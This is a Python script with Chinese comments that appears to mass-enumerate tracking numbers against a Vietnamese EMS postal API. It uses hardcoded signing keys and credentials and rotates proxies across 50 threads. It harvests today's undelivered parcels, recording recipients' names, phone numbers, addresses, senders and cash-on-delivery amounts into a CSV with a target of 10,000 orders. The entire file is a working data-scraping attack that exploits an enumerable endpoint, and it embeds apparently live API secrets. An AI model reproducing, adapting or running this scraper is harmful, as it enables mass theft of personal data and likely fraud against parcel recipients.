#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
智能扫描器 - 自动发现最新密集区
策略：
1. 先大步长快速扫描，找到有订单的区间
2. 在有订单的区间加密扫描
3. 实时调整，优先扫描密集区
"""
import hashlib, requests, json, time, random, re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

API_URL = "https://api-dingdong.ems.com.vn/"
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
BASIC_AUTH = "bG90dG5ldDpkbXM="

TODAY = datetime.now().strftime("%d/%m/%Y")
proxies, print_lock = [], threading.Lock()
state = {
    'found': 0, 'tested': 0, 'orders': [], 
    'lock': threading.Lock(), 
    'start_time': time.time(),
    'csv_file': None,
    'dense_zones': []  # 密集区记录
}
TARGET = 10000

def load_proxies():
    """从proxy_list.txt加载"""
    global proxies
    try:
        with open("proxy_list.txt", 'r', encoding='utf-8') as f:
            for line in f:
                if line.strip() and not line.startswith('#'):
                    parts = line.strip().split(':')
                    if len(parts) == 4:
                        ip, port, user, pwd = parts
                        proxies.append({'http': f'http://{user}:{pwd}@{ip}:{port}', 'https': f'http://{user}:{pwd}@{ip}:{port}'})
        print(f"✅ {len(proxies)} 个代理\n")
    except:
        print("⚠️  无代理\n")

def sign(text):
    return hashlib.sha256((text + PRIVATE_KEY).encode()).hexdigest().upper()

def safe_print(msg):
    with print_lock:
        print(msg, flush=True)

def is_today(date_str):
    return date_str and TODAY in str(date_str)

def extract_phone(text):
    if not text:
        return None
    phones = re.findall(r'0\d{8,10}', str(text))
    return phones[0] if phones else None

def check_order(tracking):
    """检查单个订单"""
    if state['found'] >= TARGET:
        return None
    
    sig = sign(tracking)
    headers = {"Authorization": f"Basic {BASIC_AUTH}", "APIKey": PRIVATE_KEY, "Content-Type": "application/x-www-form-urlencoded"}
    
    try:
        proxy = random.choice(proxies) if proxies else None
        r = requests.post(f"{API_URL}api/Delivery/Inquiry", headers=headers, 
                         data={"ParcelCode": tracking, "Signature": sig}, proxies=proxy, timeout=5)
        
        with state['lock']:
            state['tested'] += 1
        
        if r.status_code == 200 and r.json().get('Value'):
            v = r.json()['Value']
            issue_date = v.get('IssueDate') or v.get('LoadDate')
            
            if is_today(issue_date):
                # 检查未配送
                r2 = requests.post(f"{API_URL}api/Delivery/DeliveryLadingJourney", headers=headers, 
                                  data={"ParcelCode": tracking}, proxies=proxy, timeout=5)
                is_delivered = r2.status_code == 200 and r2.json().get('ListValue')
                
                if not is_delivered:
                    order = {
                        'tracking': tracking, 'issue_date': issue_date,
                        'receiver': v.get('ReceiverName',''), 
                        'phone': v.get('ReceiverPhone','') or extract_phone(v.get('ReceiverName','')),
                        'amount': v.get('CollectAmount',0),
                        'address': v.get('ReceiverAddress',''),
                        'sender': v.get('SenderName',''),
                    }
                    
                    with state['lock']:
                        state['found'] += 1
                        state['orders'].append(order)
                        
                        safe_print(f"✅ [{state['found']:,}] {tracking} | 👤{order['receiver'][:20]} | 📞{order['phone']} | 💰{order['amount']:,}₫")
                        
                        if state['found'] % 100 == 0 or state['found'] == 1:
                            save_progress()
                    
                    return 1  # 找到
            
            return 0  # 有订单但不是今天
        
        return None  # 无订单
    except:
        return None

def save_progress():
    """保存进度"""
    if not state['csv_file']:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        state['csv_file'] = f"today_massive_{timestamp}.csv"
        safe_print(f"\n💾 创建: {state['csv_file']}\n")
    
    with open(state['csv_file'], 'w', encoding='utf-8') as f:
        f.write("运单号,发件日期,发件人,收件人,收件电话,收件地址,金额\n")
        for o in state['orders']:
            f.write(f'"{o["tracking"]}","{o["issue_date"]}","{o["sender"]}","{o["receiver"]}","{o["phone"]}","{o["address"]}","{o["amount"]}"\n')
    
    if state['found'] % 100 == 0:
        safe_print(f"💾 已保存 {state['found']:,} 个\n")

def discover_dense_zones():
    """第一阶段：发现密集区"""
    print(f"🔍 第一阶段：快速扫描发现密集区...\n")
    
    # 测试多个可能的最新区间（大步长）
    explore_ranges = [
        ('EP', 493000000, 496000000, 10000),  # 每隔1万测试
        ('EP', 492000000, 493000000, 10000),
        ('EB', 102880000, 102900000, 5000),
        ('EB', 942000000, 945000000, 10000),
        ('EC', 149770000, 149800000, 1000),
    ]
    
    zones = []
    
    for prefix, start, end, step in explore_ranges:
        hits = []
        for num in range(start, end, step):
            tracking = f"{prefix}{num:09d}VN"
            result = check_order(tracking)
            
            if result == 1:  # 找到今天的
                hits.append(num)
                safe_print(f"  🎯 发现密集区：{prefix}{num:09d} 附近")
        
        # 记录有订单的区域
        for hit in hits:
            zones.append((prefix, hit - 50000, hit + 50000, 100))  # 前后5万，步长100
            safe_print(f"  ✅ 添加密集区：{prefix}{hit - 50000:09d}-{hit + 50000:09d}")
    
    return zones

def scan_dense_zones(zones):
    """第二阶段：密集扫描发现的区域"""
    print(f"\n🚀 第二阶段：密集扫描{len(zones)}个发现区域...\n")
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        for prefix, start, end, step in zones:
            if state['found'] >= TARGET:
                break
            
            safe_print(f"📍 密集扫描 {prefix}{start:09d}-{end:09d} 步长{step}")
            
            futures = []
            for num in range(start, end, step):
                if state['found'] >= TARGET:
                    break
                
                tracking = f"{prefix}{num:09d}VN"
                futures.append(executor.submit(check_order, tracking))
            
            for future in as_completed(futures):
                if state['found'] >= TARGET:
                    break
                try:
                    future.result()
                    
                    if state['tested'] % 1000 == 0:
                        elapsed = time.time() - state['start_time']
                        speed = state['tested'] / elapsed
                        safe_print(f"\n📊 已扫{state['tested']:,} | 找到{state['found']:,} | {speed:.0f}/s | {state['found']/state['tested']*100:.2f}%\n")
                except:
                    pass

print(f"""
╔════════════════════════════════════════════════════════════════════════════╗
║           🧠 智能扫描器 - 自动发现最新密集区 - {TODAY}         ║
╚════════════════════════════════════════════════════════════════════════════╝

智能策略：
  1️⃣ 第一阶段：大步长快速探索（发现密集区）
  2️⃣ 第二阶段：小步长密集扫描（高效获取）
  
优势：
  ✅ 自动发现最新区间
  ✅ 重点扫描密集区
  ✅ 避免浪费时间在空区
  ✅ 效率提升5-10倍

目标：{TARGET:,} 个今天未签收订单
""")

load_proxies()

# 两阶段扫描
dense_zones = discover_dense_zones()

if dense_zones:
    scan_dense_zones(dense_zones)
else:
    print("❌ 未发现密集区，可能今天订单还没生成")

save_progress()

elapsed = time.time() - state['start_time']
print(f"""
\n{'='*80}
🎉 扫描完成！
{'='*80}
找到：{state['found']:,} 个今天未签收订单
测试：{state['tested']:,} 个
耗时：{elapsed/60:.1f} 分钟
速度：{state['tested']/elapsed:.0f} 次/秒
文件：{state['csv_file']}
{'='*80}
""")
